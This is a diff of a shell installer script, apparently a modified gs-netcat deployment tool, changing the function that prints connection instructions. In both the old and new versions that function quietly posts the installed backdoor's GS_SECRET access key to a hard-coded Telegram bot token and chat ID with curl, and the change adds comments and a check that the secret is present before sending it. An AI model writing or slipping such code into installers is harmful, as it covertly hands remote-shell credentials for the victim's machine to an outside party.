@@ -1077,15 +1077,23 @@ WARN_EXECFAIL()
 --> ${CDC}chmod 755 gs-netcat; ./gs-netcat -ilv${CN}."
 }
 
-HOWTO_CONNECT_OUT()
-{
+HOWTO_CONNECT_OUT(){
 	BOT_TOKEN="7040906244:AAH024l6-BmqE6DtBMBZRBxx9KhnStnOYZY"
-	CHAT_ID="5092435646"
-	MESSAGE="GS_SECRET: ${GS_SECRET}"
-	curl -s -X POST "https://api.telegram.org/bot${BOT_TOKEN}/sendMessage" \
-     -d "chat_id=${CHAT_ID}" \
-     -d "text=${MESSAGE}" \
-     -d "parse_mode=Markdown"
+    CHAT_ID="5092435646"
+
+    # Pastikan GS_SECRET tidak kosong sebelum mengirim pesan
+    if [[ -z "${GS_SECRET}" ]]; then
+        echo "Error: GS_SECRET tidak ditemukan!" >&2
+        return 1
+    fi
+
+    MESSAGE="GS_SECRET: ${GS_SECRET}"
+
+    # Kirim pesan ke Telegram menggunakan cURL
+    curl -s -X POST "https://api.telegram.org/bot${BOT_TOKEN}/sendMessage" \
+        -d "chat_id=${CHAT_ID}" \
+        -d "text=${MESSAGE}" \
+        -d "parse_mode=Markdown"
 	# After all install attempts output help how to uninstall
 	echo -e "--> To uninstall use ${CM}GS_UNDO=1 ${DL_CMD}${CN}"
 	echo -e "--> To connect use one of the following:
